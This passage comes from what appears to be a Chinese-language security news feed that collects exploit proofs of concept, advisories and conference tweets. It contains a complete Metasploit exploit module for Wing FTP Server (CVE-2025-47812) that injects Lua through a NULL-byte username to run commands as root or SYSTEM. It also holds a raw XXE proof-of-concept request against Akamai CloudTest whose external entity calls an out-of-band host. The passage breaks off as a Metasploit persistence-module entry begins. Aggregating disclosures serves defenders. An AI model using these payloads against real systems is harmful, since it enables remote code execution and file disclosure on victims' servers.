class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br></pre></td><td class="code"><pre><code class="hljs livescript"><br><span class="hljs-comment">##</span><br><span class="hljs-comment"># This module requires Metasploit: https://metasploit.com/download</span><br><span class="hljs-comment"># Current source: https://github.com/rapid7/metasploit-framework</span><br><span class="hljs-comment">##</span><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">MetasploitModule</span> &lt; Msf::Exploit::Remote<br>  Rank = ExcellentRanking<br><br>  include Msf::Exploit::Remote::HttpClient<br>  prepend Msf::Exploit::Remote::AutoCheck<br><br>  def initialize(info = &#123;&#125;)<br>    super(<br>      update_info(<br>        info,<br>        <span class="hljs-string">&#x27;Name&#x27;</span> =&gt; <span class="hljs-string">&#x27;Wing FTP Server NULL-byte Authentication Bypass (CVE-2025-47812)&#x27;</span>,<br>        <span class="hljs-string">&#x27;Description&#x27;</span> =&gt; %q&#123;<br>          Wing FTP Server allows arbitrary Lua code injection via a NULL-byte (%<span class="hljs-number">00</span>) truncation bug (CVE-<span class="hljs-number">2025</span>-<span class="hljs-number">47812</span>).<br>          Supplying &lt;valid-user&gt;%<span class="hljs-number">00</span>&lt;lua-payload&gt; <span class="hljs-keyword">as</span> the username makes the C++ authentication routine validate only the prefix,<br>          <span class="hljs-keyword">while</span> the full string <span class="hljs-keyword">is</span> written unfiltered into the session file <span class="hljs-keyword">and</span> later executed <span class="hljs-keyword">with</span> root/SYSTEM privileges,<br>          leading <span class="hljs-keyword">to</span> Remote Code Execution.<br>        &#125;,<br>        <span class="hljs-string">&#x27;Author&#x27;</span> =&gt; [<br>          <span class="hljs-string">&#x27;Valentin Lobstein&#x27;</span>,   <span class="hljs-comment"># Metasploit Module</span><br>          <span class="hljs-string">&#x27;Julien Ahrens&#x27;</span>        <span class="hljs-comment"># Vulnerability Discovery</span><br>        ],<br>        <span class="hljs-string">&#x27;License&#x27;</span> =&gt; MSF_LICENSE,<br>        <span class="hljs-string">&#x27;References&#x27;</span> =&gt; [<br>          [<span class="hljs-string">&#x27;CVE&#x27;</span>, <span class="hljs-string">&#x27;2025-47812&#x27;</span>],<br>          [<span class="hljs-string">&#x27;URL&#x27;</span>, <span class="hljs-string">&#x27;https://www.rcesecurity.com/2025/06/what-the-null-wing-ftp-server-rce-cve-2025-47812/&#x27;</span>]<br>        ],<br>        <span class="hljs-string">&#x27;Platform&#x27;</span> =&gt; %w[unix linux win],<br>        <span class="hljs-string">&#x27;Arch&#x27;</span> =&gt; [ARCH_CMD],<br>        <span class="hljs-string">&#x27;Targets&#x27;</span> =&gt; [<br>          [<br>            <span class="hljs-string">&#x27;Unix/Linux Command Shell&#x27;</span>, &#123;<br>              <span class="hljs-string">&#x27;Platform&#x27;</span> =&gt; %w[unix linux],<br>              <span class="hljs-string">&#x27;Arch&#x27;</span> =&gt; ARCH_CMD<br>              <span class="hljs-comment"># tested with cmd/linux/http/x64/meterpreter/reverse_tcp</span><br>            &#125;<br>          ],<br>          [<br>            <span class="hljs-string">&#x27;Windows Command Shell&#x27;</span>, &#123;<br>              <span class="hljs-string">&#x27;Platform&#x27;</span> =&gt; <span class="hljs-string">&#x27;win&#x27;</span>,<br>              <span class="hljs-string">&#x27;Arch&#x27;</span> =&gt; ARCH_CMD<br>              <span class="hljs-comment"># tested with cmd/windows/http/x64/meterpreter/reverse_tcp</span><br>            &#125;<br>          ]<br>        ],<br>        <span class="hljs-string">&#x27;DefaultTarget&#x27;</span> =&gt; <span class="hljs-number">0</span>,<br>        <span class="hljs-string">&#x27;Privileged&#x27;</span> =&gt; <span class="hljs-literal">true</span>,<br>        <span class="hljs-string">&#x27;DisclosureDate&#x27;</span> =&gt; <span class="hljs-string">&#x27;2025-06-30&#x27;</span>,<br>        <span class="hljs-string">&#x27;Notes&#x27;</span> =&gt; &#123;<br>          <span class="hljs-string">&#x27;Stability&#x27;</span> =&gt; [CRASH_SAFE],<br>          <span class="hljs-string">&#x27;Reliability&#x27;</span> =&gt; [REPEATABLE_SESSION],<br>          <span class="hljs-string">&#x27;SideEffects&#x27;</span> =&gt; [IOC_IN_LOGS, ARTIFACTS_ON_DISK]<br>        &#125;<br>      )<br>    )<br><br>    register_options(<br>      [<br>        OptString.<span class="hljs-keyword">new</span>(<span class="hljs-string">&#x27;USERNAME&#x27;</span>, [ <span class="hljs-literal">true</span>, <span class="hljs-string">&#x27;Valid username for authentication&#x27;</span>, <span class="hljs-string">&#x27;anonymous&#x27;</span> ]),<br>        OptString.<span class="hljs-keyword">new</span>(<span class="hljs-string">&#x27;PASSWORD&#x27;</span>, [ <span class="hljs-literal">false</span>, <span class="hljs-string">&#x27;Password for authentication&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span> ])<br>      ]<br>    )<br>  end<br><br>  def check<br>    res = send_request_cgi(<br>      <span class="hljs-string">&#x27;method&#x27;</span> =&gt; <span class="hljs-string">&#x27;GET&#x27;</span>,<br>      <span class="hljs-string">&#x27;uri&#x27;</span> =&gt; normalize_uri(target_uri.path, <span class="hljs-string">&#x27;login.html&#x27;</span>)<br>    )<br>    <span class="hljs-keyword">return</span> CheckCode::Safe(<span class="hljs-string">&#x27;Not a Wing FTP Web Client&#x27;</span>) <span class="hljs-keyword">unless</span> res&amp;.body&amp;.include?(<span class="hljs-string">&#x27;Wing FTP Server - Web Client&#x27;</span>)<br><br>    suffix = Rex::Text.rand_text_alpha(<span class="hljs-number">8</span>)<br>    user = datastore[<span class="hljs-string">&#x27;USERNAME&#x27;</span>]<br>    pass = datastore[<span class="hljs-string">&#x27;PASSWORD&#x27;</span>]<br>    payload = <span class="hljs-string">&quot;username=<span class="hljs-subst">#&#123;user&#125;</span>%00<span class="hljs-subst">#&#123;suffix&#125;</span>&amp;password=<span class="hljs-subst">#&#123;pass&#125;</span>&amp;username_val=<span class="hljs-subst">#&#123;user&#125;</span>&amp;password_val=<span class="hljs-subst">#&#123;pass&#125;</span>&quot;</span><br><br>    res = send_request_cgi(<br>      <span class="hljs-string">&#x27;method&#x27;</span> =&gt; <span class="hljs-string">&#x27;POST&#x27;</span>,<br>      <span class="hljs-string">&#x27;uri&#x27;</span> =&gt; normalize_uri(target_uri.path, <span class="hljs-string">&#x27;loginok.html&#x27;</span>),<br>      <span class="hljs-string">&#x27;headers&#x27;</span> =&gt; &#123;<br>        <span class="hljs-string">&#x27;Content-Type&#x27;</span> =&gt; <span class="hljs-string">&#x27;application/x-www-form-urlencoded&#x27;</span>,<br>        <span class="hljs-string">&#x27;Referer&#x27;</span> =&gt; normalize_uri(target_uri.path, <span class="hljs-string">&#x27;login.html&#x27;</span>) + <span class="hljs-string">&#x27;?lang=english&#x27;</span><br>      &#125;,<br>      <span class="hljs-string">&#x27;data&#x27;</span> =&gt; payload<br>    )<br>    <span class="hljs-keyword">return</span> CheckCode::Unknown(<span class="hljs-string">&#x27;No response&#x27;</span>) <span class="hljs-keyword">unless</span> res<br><br>    uid = res.get_cookies.to_s[<span class="hljs-regexp">/UID=[^;]+/</span>]<br>    <span class="hljs-keyword">return</span> CheckCode::Appears(<span class="hljs-string">&quot;UID cookie received: <span class="hljs-subst">#&#123;uid&#125;</span>&quot;</span>) <span class="hljs-keyword">if</span> uid<br><br>    CheckCode::Safe(<span class="hljs-string">&#x27;UID cookie not found; not vulnerable&#x27;</span>)<br>  end<br><br>  def exploit<br>    user = datastore[<span class="hljs-string">&#x27;USERNAME&#x27;</span>]<br>    pass = datastore[<span class="hljs-string">&#x27;PASSWORD&#x27;</span>]<br>    hex = payload.encoded.unpack(<span class="hljs-string">&#x27;H*&#x27;</span>).first<br><br>    lua = &lt;&lt;~LUA<br>      ]]<br>      local <span class="hljs-keyword">function</span> hx(s)<span class="hljs-comment">#&#123;&#x27; &#x27;&#125;</span><br>        <span class="hljs-keyword">return</span> (s:gsub(<span class="hljs-string">&#x27;..&#x27;</span>, <span class="hljs-keyword">function</span>(x)<span class="hljs-comment">#&#123;&#x27; &#x27;&#125;</span><br>          <span class="hljs-keyword">return</span> string.char(tonumber(x,<span class="hljs-number">16</span>))<span class="hljs-comment">#&#123;&#x27; &#x27;&#125;</span><br>        end))<span class="hljs-comment">#&#123;&#x27; &#x27;&#125;</span><br>      end<br>      local cmd = hx(<span class="hljs-string">&quot;<span class="hljs-subst">#&#123;hex&#125;</span>&quot;</span>)<br>      local h = io.popen(cmd)<br>      local r = h:read(<span class="hljs-string">&quot;*a&quot;</span>)<br>      h:close()<br>    LUA<br><br>    inj = <span class="hljs-string">&quot;<span class="hljs-subst">#&#123;user&#125;</span>%00&quot;</span> + Rex::Text.uri_encode(lua).gsub(<span class="hljs-string">&#x27;%0a&#x27;</span>, <span class="hljs-string">&#x27;%0d&#x27;</span>) + <span class="hljs-string">&#x27;--&#x27;</span><br><br>    post_data = [<br>      <span class="hljs-string">&quot;username=<span class="hljs-subst">#&#123;inj&#125;</span>&quot;</span>,<br>      <span class="hljs-string">&quot;password=<span class="hljs-subst">#&#123;pass&#125;</span>&quot;</span>,<br>      <span class="hljs-string">&quot;username_val=<span class="hljs-subst">#&#123;user&#125;</span>&quot;</span>,<br>      <span class="hljs-string">&quot;password_val=<span class="hljs-subst">#&#123;pass&#125;</span>&quot;</span><br>    ].join(<span class="hljs-string">&#x27;&amp;&#x27;</span>)<br><br>    res = send_request_cgi(<br>      <span class="hljs-string">&#x27;method&#x27;</span> =&gt; <span class="hljs-string">&#x27;POST&#x27;</span>,<br>      <span class="hljs-string">&#x27;uri&#x27;</span> =&gt; normalize_uri(target_uri.path, <span class="hljs-string">&#x27;loginok.html&#x27;</span>),<br>      <span class="hljs-string">&#x27;headers&#x27;</span> =&gt; &#123;<br>        <span class="hljs-string">&#x27;Content-Type&#x27;</span> =&gt; <span class="hljs-string">&#x27;application/x-www-form-urlencoded&#x27;</span>,<br>        <span class="hljs-string">&#x27;Referer&#x27;</span> =&gt; normalize_uri(target_uri.path, <span class="hljs-string">&#x27;login.html&#x27;</span>) + <span class="hljs-string">&#x27;?lang=english&#x27;</span><br>      &#125;,<br>      <span class="hljs-string">&#x27;data&#x27;</span> =&gt; post_data<br>    )<br>    fail_with(Failure::UnexpectedReply, <span class="hljs-string">&#x27;Injection failed&#x27;</span>) <span class="hljs-keyword">unless</span> res&amp;.code == <span class="hljs-number">200</span><br><br>    uid = res.get_cookies.to_s[<span class="hljs-regexp">/UID=[^;]+/</span>]<br>    fail_with(Failure::UnexpectedReply, <span class="hljs-string">&#x27;UID cookie not returned&#x27;</span>) <span class="hljs-keyword">unless</span> uid<br>    print_good(<span class="hljs-string">&quot;Received UID: <span class="hljs-subst">#&#123;uid&#125;</span>&quot;</span>)<br><br>    send_request_cgi(<br>      <span class="hljs-string">&#x27;method&#x27;</span> =&gt; <span class="hljs-string">&#x27;GET&#x27;</span>,<br>      <span class="hljs-string">&#x27;uri&#x27;</span> =&gt; normalize_uri(target_uri.path, <span class="hljs-string">&#x27;dir.html&#x27;</span>),<br>      <span class="hljs-string">&#x27;headers&#x27;</span> =&gt; &#123; <span class="hljs-string">&#x27;Cookie&#x27;</span> =&gt; uid &#125;<br>    )<br>  end<br>end<br><br></code></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; Wing FTP Server NULL-byte Authenticatio</summary>
      
    
    
    
    <category term="Github Poc" scheme="http://example.com/categories/Github-Poc/"/>
    
    
    <category term="命令执行" scheme="http://example.com/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
    
    <category term="rapid7/metasploit-framework:github issues" scheme="http://example.com/tags/rapid7-metasploit-framework-github-issues/"/>
    
  </entry>
  
  <entry>
    <title>Akamai CloudTest XXE注入漏洞</title>
    <link href="http://example.com/2025/07/01/github_4180806610/"/>
    <id>http://example.com/2025/07/01/github_4180806610/</id>
    <published>2025-07-01T21:15:14.200Z</published>
    <updated>2025-07-01T21:15:14.197Z</updated>
    
    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> Akamai CloudTest XXE注入漏洞</p><p><strong>漏洞编号：</strong></p><ul><li><strong>CVE：</strong> CVE-2025-49493</li></ul><p><strong>漏洞类型：</strong> XML实体注入</p><p><strong>漏洞等级：</strong> 高危</p><p><strong>漏洞描述：</strong> Akamai CloudTest在版本60 2025.06.02 (12988)之前，通过<code>/concerto/services/RepositoryService</code> SOAP端点存在XML外部实体(XXE)注入漏洞，允许文件包含。</p><p><strong>产品厂商：</strong> Akamai</p><p><strong>产品名称：</strong> Akamai CloudTest</p><p><strong>影响版本：</strong> version &lt; 60 2025.06.02 (12988)</p><p><strong>来源：</strong> <a href="https://github.com/MuhammadWaseem29/CVE-2025-49493-Poc">https://github.com/MuhammadWaseem29/CVE-2025-49493-Poc</a></p><p><strong>类型：</strong> CVE-2025:github search</p><h1 id="仓库文件"><a href="#仓库文件" class="headerlink" title="仓库文件"></a>仓库文件</h1><ul><li>README.md</li></ul><h1 id="来源概述"><a href="#来源概述" class="headerlink" title="来源概述"></a>来源概述</h1><h2 id="Akamai-CloudTest-XXE-Injection"><a href="#Akamai-CloudTest-XXE-Injection" class="headerlink" title="Akamai CloudTest - XXE Injection"></a>Akamai CloudTest - XXE Injection</h2><p>Akamai CloudTest before <code>60 2025.06.02 (12988)</code> allows file inclusion via XML External Entity (XXE) injection through the <code>/concerto/services/RepositoryService</code> SOAP endpoint.</p><hr><h3 id="References"><a href="#References" class="headerlink" title="References"></a>References</h3><ul><li><a href="https://xbow.com/blog/xbow-akamai-cloudtest-xxe/">https://xbow.com/blog/xbow-akamai-cloudtest-xxe/</a></li><li><a href="https://techdocs.akamai.com/cloudtest/changelog/june-2-2025-enhancements-and-bug-fixes">https://techdocs.akamai.com/cloudtest/changelog/june-2-2025-enhancements-and-bug-fixes</a></li></ul><hr><p><img src="https://github.com/user-attachments/assets/78ab085d-b700-4103-bf2e-d4719c000761" alt="image"></p><h3 id="Proof-of-Concept-Raw-HTTP-Request"><a href="#Proof-of-Concept-Raw-HTTP-Request" class="headerlink" title="Proof of Concept (Raw HTTP Request)"></a>Proof of Concept (Raw HTTP Request)</h3><pre><code class="language-http">POST //concerto/services/RepositoryService HTTP/1.1Host: readacted.comCache-Control: max-age=0Sec-Ch-Ua: &quot;Not)A;Brand&quot;;v=&quot;8&quot;, &quot;Chromium&quot;;v=&quot;138&quot;, &quot;Brave&quot;;v=&quot;138&quot;Sec-Ch-Ua-Mobile: ?0Sec-Ch-Ua-Platform: &quot;macOS&quot;Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8Sec-Gpc: 1Accept-Language: en-US,en;q=0.9Sec-Fetch-Site: noneSec-Fetch-Mode: navigateSec-Fetch-User: ?1Sec-Fetch-Dest: documentAccept-Encoding: gzip, deflate, brPriority: u=0, iConnection: keep-aliveContent-Type: application/x-www-form-urlencodedContent-Length: 610&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE soapenv:Envelope [  &lt;!ENTITY xxe SYSTEM &quot;http://b6it5hei11vmt9as2lbg98h4gvmrahy6.oastify.com&quot;&gt;]&gt;&lt;soapenv:Envelope xmlns:soapenv=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;                  xmlns:rep=&quot;http://example.com/services/repository&quot;&gt;   &lt;soapenv:Header/&gt;   &lt;soapenv:Body&gt;      &lt;rep:getUIBundleObjectXml&gt;         &lt;rep:uiBundleRequestXml&gt;&amp;xxe;&lt;/rep:uiBundleRequestXml&gt;      &lt;/rep:getUIBundleObjectXml&gt;   &lt;/soapenv:Body&gt;&lt;/soapenv:Envelope&gt;</code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; Akamai CloudTest XXE注入漏洞&lt;/p&gt;
&lt;p&gt;&lt;strong</summary>
      
    
    
    
    <category term="Github Poc" scheme="http://example.com/categories/Github-Poc/"/>
    
    
    <category term="CVE-2025:github search" scheme="http://example.com/tags/CVE-2025-github-search/"/>
    
    <category term="XML实体注入" scheme="http://example.com/tags/XML%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>BlackHatEvents twitter update</title>
    <link href="http://example.com/2025/07/01/twitter_327590077/"/>
    <id>http://example.com/2025/07/01/twitter_327590077/</id>
    <published>2025-07-01T21:00:26.254Z</published>
    <updated>2025-07-01T21:00:26.251Z</updated>
    
    <content type="html"><![CDATA[<p><strong>博主：</strong> BlackHatEvents</p><p><strong>推文：</strong> 想提升你的Kubernetes安全技能吗？📈 立即报名参加#BHUSA培训“无需0-Day：攻击与保护Kubernetes、Linux及容器”，向专家Jay Beale学习攻防实战技巧！这是一次动手实践、真实场景的培训。立即抢占席位 &gt;&gt; <a href="https://t.co/a8ZtQtSeMV">https://t.co/a8ZtQtSeMV</a></p><p><strong>链接：</strong> <a href="https://x.com/BlackHatEvents/status/1940146644021883380">https://x.com/BlackHatEvents/status/1940146644021883380</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;strong&gt;博主：&lt;/strong&gt; BlackHatEvents&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;推文：&lt;/strong&gt; 想提升你的Kubernetes安全技能吗？📈 立即报名参加#BHUSA培训“无需0-Day：攻击与保护Kubernetes、Linux及容器”，</summary>
      
    
    
    
    <category term="推特监控" scheme="http://example.com/categories/%E6%8E%A8%E7%89%B9%E7%9B%91%E6%8E%A7/"/>
    
    
    <category term="BlackHatEvents" scheme="http://example.com/tags/BlackHatEvents/"/>
    
  </entry>
  
  <entry>
    <title>@modelcontextprotocol/server-filesystem allows for path validation bypass via prefix matching and symlink handling</title>
    <link href="http://example.com/2025/07/01/github_3806837885/"/>
    <id>http://example.com/2025/07/01/github_3806837885/</id>
    <published>2025-07-01T20:30:08.500Z</published>
    <updated>2025-07-01T20:30:08.498Z</updated>
    
    <content type="html"><![CDATA[<p><strong>链接：</strong> <a href="https://github.com/advisories/GHSA-q66q-fx2p-7w4m">https://github.com/advisories/GHSA-q66q-fx2p-7w4m</a></p><p><strong>仓库 Star：</strong> 57079</p><p><strong>参考链接：</strong></p><ul><li><p><a href="https://github.com/modelcontextprotocol/servers/security/advisories/GHSA-q66q-fx2p-7w4m">https://github.com/modelcontextprotocol/servers/security/advisories/GHSA-q66q-fx2p-7w4m</a></p></li><li><p><a href="https://github.com/modelcontextprotocol/servers/commit/d00c60df9d74dba8a3bb13113f8904407cda594f">https://github.com/modelcontextprotocol/servers/commit/d00c60df9d74dba8a3bb13113f8904407cda594f</a></p></li><li><p><a href="https://github.com/advisories/GHSA-q66q-fx2p-7w4m">https://github.com/advisories/GHSA-q66q-fx2p-7w4m</a></p></li></ul><p><strong>描述：</strong></p><p>Versions of Filesystem prior to 0.6.3 &amp; 2025.7.1 could allow access to unintended files via symlinks within allowed directories. Users are advised to upgrade to 2025.7.1 to resolve.</p><p>Thank you to Elad Beber (Cymulate) for reporting these issues.</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;strong&gt;链接：&lt;/strong&gt; &lt;a href=&quot;https://github.com/advisories/GHSA-q66q-fx2p-7w4m&quot;&gt;https://github.com/advisories/GHSA-q66q-fx2p-7w4m&lt;/a&gt;&lt;/p</summary>
      
    
    
    
    <category term="安全公告" scheme="http://example.com/categories/%E5%AE%89%E5%85%A8%E5%85%AC%E5%91%8A/"/>
    
    
    <category term="Github Advisory" scheme="http://example.com/tags/Github-Advisory/"/>
    
  </entry>
  
  <entry>
    <title>@modelcontextprotocol/server-filesystem vulnerability allows for path validation bypass via colliding path prefix</title>
    <link href="http://example.com/2025/07/01/github_4100733700/"/>
    <id>http://example.com/2025/07/01/github_4100733700/</id>
    <published>2025-07-01T20:30:06.948Z</published>
    <updated>2025-07-01T20:30:06.946Z</updated>
    
    <content type="html"><![CDATA[<p><strong>链接：</strong> <a href="https://github.com/advisories/GHSA-hc55-p739-j48w">https://github.com/advisories/GHSA-hc55-p739-j48w</a></p><p><strong>仓库 Star：</strong> 57079</p><p><strong>参考链接：</strong></p><ul><li><p><a href="https://github.com/modelcontextprotocol/servers/security/advisories/GHSA-hc55-p739-j48w">https://github.com/modelcontextprotocol/servers/security/advisories/GHSA-hc55-p739-j48w</a></p></li><li><p><a href="https://github.com/modelcontextprotocol/servers/commit/cc99bdabdcad93a58877c5f3ab20e21d4394423d">https://github.com/modelcontextprotocol/servers/commit/cc99bdabdcad93a58877c5f3ab20e21d4394423d</a></p></li><li><p><a href="https://github.com/advisories/GHSA-hc55-p739-j48w">https://github.com/advisories/GHSA-hc55-p739-j48w</a></p></li></ul><p><strong>描述：</strong></p><p>Versions of Filesystem prior to 0.6.3 &amp; 2025.7.1 could allow access to unintended files in cases where the prefix matches an allowed directory. Users are advised to upgrade to 2025.7.1 to resolve the issue.</p><p>Thank you to Elad Beber (Cymulate) for reporting these issues.</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;strong&gt;链接：&lt;/strong&gt; &lt;a href=&quot;https://github.com/advisories/GHSA-hc55-p739-j48w&quot;&gt;https://github.com/advisories/GHSA-hc55-p739-j48w&lt;/a&gt;&lt;/p</summary>
      
    
    
    
    <category term="安全公告" scheme="http://example.com/categories/%E5%AE%89%E5%85%A8%E5%85%AC%E5%91%8A/"/>
    
    
    <category term="Github Advisory" scheme="http://example.com/tags/Github-Advisory/"/>
    
  </entry>
  
  <entry>
    <title>BlackHatEvents twitter update</title>
    <link href="http://example.com/2025/07/01/twitter_1472917564/"/>
    <id>http://example.com/2025/07/01/twitter_1472917564/</id>
    <published>2025-07-01T20:00:35.404Z</published>
    <updated>2025-07-01T20:00:35.402Z</updated>
    
    <content type="html"><![CDATA[<p><strong>博主：</strong> BlackHatEvents</p><p><strong>推文：</strong> 🚨 刚接触网络安全？从这里开始。🕵️‍♂️ 在#BlackHatUSA 2025上的《基础网络黑客》是你动手实践真实世界网络应用漏洞的入门课程📍 拉斯维加斯 | 🗓️ 8月3日至4日<br>🔗 了解更多并注册：<a href="https://t.co/N6fWSqmcP5">https://t.co/N6fWSqmcP5</a></p><p><strong>链接：</strong> <a href="https://x.com/BlackHatEvents/status/1940130035773440043">https://x.com/BlackHatEvents/status/1940130035773440043</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;strong&gt;博主：&lt;/strong&gt; BlackHatEvents&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;推文：&lt;/strong&gt; 🚨 刚接触网络安全？从这里开始。🕵️‍♂️ 在#BlackHatUSA 2025上的《基础网络黑客》是你动手实践真实世界网络应用漏洞的入门课程</summary>
      
    
    
    
    <category term="推特监控" scheme="http://example.com/categories/%E6%8E%A8%E7%89%B9%E7%9B%91%E6%8E%A7/"/>
    
    
    <category term="BlackHatEvents" scheme="http://example.com/tags/BlackHatEvents/"/>
    
  </entry>
  
  <entry>
    <title>BlackHatEvents twitter update</title>
    <link href="http://example.com/2025/07/01/twitter_466714780/"/>
    <id>http://example.com/2025/07/01/twitter_466714780/</id>
    <published>2025-07-01T20:00:27.026Z</published>
    <updated>2025-07-01T20:00:27.022Z</updated>
    
    <content type="html"><![CDATA[<p><strong>博主：</strong> BlackHatEvents</p><p><strong>推文：</strong> 🚨 #BHUSA 2025首轮主题演讲重磅登场！从全球隐私倡导者到网络安全传奇人物，今年的演讲阵容已经引起轰动。<br>🔗 点击此处深入了解详情：<a href="https://t.co/oXZNyNkyNu">https://t.co/oXZNyNkyNu</a><br>👀 更多主题演讲即将公布——敬请期待 <a href="https://t.co/51TxMORo0z">https://t.co/51TxMORo0z</a></p><p><strong>链接：</strong> <a href="https://x.com/BlackHatEvents/status/1940130749828481115">https://x.com/BlackHatEvents/status/1940130749828481115</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;strong&gt;博主：&lt;/strong&gt; BlackHatEvents&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;推文：&lt;/strong&gt; 🚨 #BHUSA 2025首轮主题演讲重磅登场！从全球隐私倡导者到网络安全传奇人物，今年的演讲阵容已经引起轰动。&lt;br&gt;🔗 点击此处深入了解详</summary>
      
    
    
    
    <category term="推特监控" scheme="http://example.com/categories/%E6%8E%A8%E7%89%B9%E7%9B%91%E6%8E%A7/"/>
    
    
    <category term="BlackHatEvents" scheme="http://example.com/tags/BlackHatEvents/"/>
    
  </entry>
  
  <entry>
    <title>Periodic Script Persistence</title>
    <link href="http://example.com/2025/07/01/github_2975933168/"/>
    <id>http://example.com/2025/07/01/github_2975933168/</id>
    <published>2025-07-01T19:15:46.923Z</published>
    <updated>2025-07-01T19:15:46.921Z</updated>
    
    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> Periodic Script Persistence</p><p><strong>漏洞类型：</strong> 权限提升</p><p><strong>漏洞等级：</strong> 高危</p><p><strong>漏洞描述：</strong> 该模块通过在&#x2F;etc&#x2F;periodic目录下写入脚本实现持久化。根据The Art of Mac Malware，目前没有恶意软件以这种方式实现持久化（2024年）。此载荷需要root权限运行，可在BSD、OSX或Arch Linux上运行。</p><p><strong>产品名称：</strong> Mac OS X, BSD, Arch Linux</p><p><strong>来源：</strong> <a href="https://github.com/rapid7/metasploit-framework/blob/e465720a3c0a51136d96fa41ed70f4827c1e77dc/modules%2Fexploits%2Fmulti%2Flocal%2Fperiodic_script_persistence.rb">https://github.com/rapid7/metasploit-framework/blob/e465720a3c0a51136d96fa41ed70f4827c1e77dc/modules%2Fexploits%2Fmulti%2Flocal%2Fperiodic_script_persistence.rb</a></p><p><strong>类型：</strong> rapid7&#x2F;metasploit-framework:github issues</p><h1 id="POC详情"><a href="#POC详情" class="headerlink" title="POC详情"></a>POC详情</h1><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span 